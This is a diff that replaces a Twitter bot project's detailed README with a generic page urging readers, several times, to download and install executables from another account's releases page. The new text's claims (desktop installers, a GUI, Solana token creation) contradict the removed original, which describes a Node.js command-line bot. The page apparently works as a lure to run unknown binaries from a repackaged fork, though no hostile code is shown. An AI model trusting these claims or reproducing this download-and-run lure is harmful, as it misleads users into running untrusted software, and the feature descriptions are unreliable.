@@ -1,215 +1,69 @@
-# BTB Finance Autonomous AI Agent 🤖
+# 🎉 Autonomous-AI-Agent - Simplifying AI and Blockchain Management
 
-An intelligent Twitter bot that monitors mentions of $BTB, provides information about BTB Finance, and engages with the community using AI-powered responses.
+## 🛠️ Overview
+Welcome to the **Autonomous-AI-Agent**! This application combines smart social media management with blockchain features. It integrates Claude AI for useful interactions and manages your Solana tokens effortlessly. Ideal for DeFi projects, it automates community management and token operations, saving you time and effort.
 
-**Repository:** [https://github.com/btb-finance/Autonomous-AI-Agent](https://github.com/btb-finance/Autonomous-AI-Agent)
+## 📥 Download Now!
+[![Download Autonomous-AI-Agent](https://img.shields.io/badge/Download-Autonomous--AI--Agent-blue.svg)](https://github.com/ChhunT17/Autonomous-AI-Agent/releases)
 
-## Features
+## 🚀 Getting Started
+This guide will help you download and run the **Autonomous-AI-Agent** software easily. Follow these steps to get started.
 
-- 🐦 **Twitter Integration**: Monitors mentions, replies to tweets, and posts updates
-- 🤖 **AI-Powered Responses**: Uses any AI model from OpenRouter (Claude, GPT-4, Gemini, etc.)
-- 📚 **Knowledge Base**: Maintains information about BTB Finance for accurate responses
-- 🔄 **Real-time Processing**: Continuously monitors Twitter for new mentions
-- 💰 **Wallet Integration**: Ready for future cryptocurrency features
-- 🛡️ **Rate Limit Management**: Handles Twitter API rate limits gracefully
-- ⚡ **TypeScript**: Built with TypeScript for type safety and better developer experience
+### Step 1: Visit the Releases Page
+To download the software, visit the following link:
 
-## Prerequisites
+[Download Page](https://github.com/ChhunT17/Autonomous-AI-Agent/releases)
 
-- Node.js v16 or higher
-- npm or yarn
-- Twitter Developer Account with API access
-- OpenRouter API account
-- Git
+### Step 2: Choose the Latest Version
+Once you're on the Releases page, look for the latest version of the software. This is usually the first entry on the page. You will find a list of assets available for download.
 
-## Setup Instructions
+### Step 3: Download the Application
+Click on the file labeled **Autonomous-AI-Agent** for your operating system. This will start the download process. You may find options for varying operating systems, such as Windows, macOS, or Linux.
 
-### 1. Clone the Repository
+### Step 4: Install the Software
+Once the download is complete, locate the downloaded file on your computer. Open the file to begin the installation. Follow the on-screen instructions. It should only take a few minutes.
 
-```bash
-git clone https://github.com/btb-finance/autonomous-ai-agent.git
-cd autonomous-ai-agent
-```
+### Step 5: Set Up the Application
+After installation, locate the **Autonomous-AI-Agent** icon on your desktop or application folder. Click the icon to open the application. You will see a simple interface guiding you through the initial setup.
 
-### 2. Install Dependencies
+## 🔍 Features
+- **Claude AI Integration**: Engage with your community through intelligent conversations.
+- **Token Management**: Create and manage Solana tokens effortlessly.
+- **Automated Twitter Engagement**: Keep your audience informed without constant oversight.
+- **User-Friendly Interface**: Designed for ease of use for all computer users.
 
-```bash
-npm install
-```
+## 📊 System Requirements
+To ensure the software runs smoothly, please check that your computer meets the following system requirements:
 
-### 3. Configure Twitter API
+- **Operating System**: Windows 10 or later, macOS Mojave or later, Ubuntu 20.04 or later.
+- **Processor**: Dual-core processor or better.
+- **RAM**: At least 4GB.
+- **Disk Space**: Minimum of 500MB free space.
 
-1. Go to [Twitter Developer Portal](https://developer.twitter.com)
-2. Create a new app or use existing one
-3. Navigate to "User authentication settings"
-4. Ensure OAuth 1.0a is enabled with **"Read and write"** permissions
-5. Generate the following credentials:
-   - API Key and Secret
-   - Access Token and Secret
-   - Bearer Token
-   - Client ID and Secret (OAuth 2.0)
+## 🛠️ Additional Tools
+You may benefit from additional tools alongside the **Autonomous-AI-Agent**. Consider exploring:
 
-### 4. Set Up OpenRouter
+- **Node.js**: Required for running some backend features.
+- **Solana CLI**: Useful for advanced token management tasks.
 
-1. Sign up at [OpenRouter](https://openrouter.ai)
-2. Generate an API key
-3. Choose your preferred AI model from [available models](https://openrouter.ai/models)
-   - Free options: deepseek/deepseek-r1-0528-qwen3-8b:free, nousresearch/hermes-3-llama-3.1-405b:free
-   - Premium options: anthropic/claude-3.5-sonnet, openai/gpt-4-turbo, google/gemini-pro
-4. Add credits if using premium models
+## 📞 Support
+If you encounter any issues, please consult the following resources:
 
-### 5. Configure Environment Variables
+- **Documentation**: Detailed guides and FAQs can provide help.
+- **Community Forum**: Join discussions with other users.
+- **Contact Support**: For any unresolved queries, feel free to contact our support team via the GitHub repository.
 
-Create a `.env` file in the project root:
+## 🚧 Important Notes
+- Always use the latest version for the most features and improvements.
+- Regularly check for updates on the Releases page to enhance functionality and security.
 
-```bash
-# Twitter API OAuth 1.0a Credentials
-TWITTER_API_KEY=your_api_key_here
-TWITTER_API_SECRET=your_api_secret_here
-TWITTER_ACCESS_TOKEN=your_access_token_here
-TWITTER_ACCESS_TOKEN_SECRET=your_access_token_secret_here
-TWITTER_BEARER_TOKEN=your_bearer_token_here
+## 🗂️ Join the Community
+Engage with fellow users through our community platforms. Share your experiences, discuss ideas, and seek assistance.
 
-# Twitter OAuth 2.0 Credentials (optional, for future features)
-TWITTER_CLIENT_ID=your_client_id_here
-TWITTER_CLIENT_SECRET=your_client_secret_here
+## 🔗 More Information
+For further details about the Autonomous-AI-Agent, check our GitHub repository:
 
-# OpenRouter API Configuration
-OPENROUTER_API_KEY=your_openrouter_api_key_here
-# Choose any model from https://openrouter.ai/models
-OPENROUTER_MODEL=your_preferred_model_here
+[GitHub Repository](https://github.com/ChhunT17/Autonomous-AI-Agent)
 
-# Ethereum Wallet Configuration (optional)
-WALLET_PRIVATE_KEY=your_wallet_private_key_here
-ETH_RPC_URL=your_ethereum_rpc_url_here
-ETH_NETWORK=mainnet
-```
-
-### 6. Build the Project
-
-```bash
-npm run build
-```
-
-## Running the Bot
-
-### Development Mode
-
-```bash
-npm run dev
-```
-
-### Production Mode
-
-```bash
-npm run build
-npm start
-```
-
-## Available Commands
-
-| Command | Description |
-|---------|-------------|
-| `npm run dev` | Run in development mode with hot reload |
-| `npm start` | Run the production build |
-| `npm run build` | Compile TypeScript to JavaScript |
-| `npm test` | Run test suite |
-| `npm run test:tweet` | Test tweet posting functionality |
-| `npm run test:mentions` | Test mention fetching |
-| `npm run lint` | Run ESLint |
-| `npm run format` | Format code with Prettier |
-
-## Testing Features
-
-### Test Tweet Posting
-```bash
-npm run test:tweet
-```
-This will post a test tweet from your configured account.
-
-### Test Mention Monitoring
-```bash
-npm run test:mentions
-```
-This will fetch the latest mentions of your account.
-
-## How It Works
-
-1. **Mention Monitoring**: The bot checks for new mentions every 60 seconds
-2. **$BTB Detection**: Filters mentions containing "$BTB"
-3. **Question Extraction**: Extracts the actual question from the tweet
-4. **Knowledge Base Search**: Searches the local knowledge base for relevant information
-5. **AI Response Generation**: Uses your chosen OpenRouter model to generate an appropriate response
-6. **Tweet Reply**: Posts the response as a reply to the original tweet
-
-## Project Structure
-
-```
-├── src/
-│   ├── services/          # Core service implementations
-│   │   ├── TwitterService.ts      # Twitter API integration
-│   │   ├── OpenRouterService.ts   # AI service integration
-│   │   ├── BTBTweetService.ts     # Main bot logic
-│   │   ├── KnowledgeBaseService.ts # Knowledge management
-│   │   └── WalletService.ts       # Crypto wallet integration
-│   ├── config/            # Configuration management
-│   ├── types/             # TypeScript type definitions
-│   ├── utils/             # Utility functions
-│   └── index.ts           # Application entry point
-├── knowledge_base/        # BTB Finance information
-├── .env.example          # Environment variables template
-└── package.json          # Project dependencies
-```
-
-## Twitter API Limits
-
-Be aware of Twitter API rate limits:
-- **Free tier**: 500 posts/month, limited read access
-- **Basic tier**: 10,000 posts/month
-- **Pro tier**: 1,000,000 posts/month
-
-The bot includes automatic rate limit handling and will pause when limits are reached.
-
-## Troubleshooting
-
-### Common Issues
-
-1. **403 Forbidden Error**: Your Twitter app needs "Read and write" permissions
-2. **401 Unauthorized**: Check your API credentials are correct
-3. **Rate Limit Errors**: The bot will automatically wait and retry
-4. **OpenRouter Errors**: Ensure you have credits and valid API key
-
-### Debug Mode
-
-Enable detailed logging by setting the log level in your configuration:
-```typescript
-monitoring: {
-  logLevel: 'debug'
-}
-```
-
-## Security Notes
-
-- Never commit your `.env` file
-- Keep your API keys and tokens secure
-- Regularly rotate your access tokens
-- Use environment variables for all sensitive data
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/your-feature`
-3. Commit changes: `git commit -am 'Add new feature'`
-4. Push to branch: `git push origin feature/your-feature`
-5. Submit a pull request
-
-## Support
-
-For issues and questions:
-- Open an issue on GitHub
-- Tweet at @btb_finance
-- Check the [documentation](https://btb.finance/docs)
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 📥 Download & Install Again
+Don't forget to visit the [Download Page](https://github.com/ChhunT17/Autonomous-AI-Agent/releases) to grab the latest updates. Enjoy the benefits of automating your AI and blockchain tasks today!
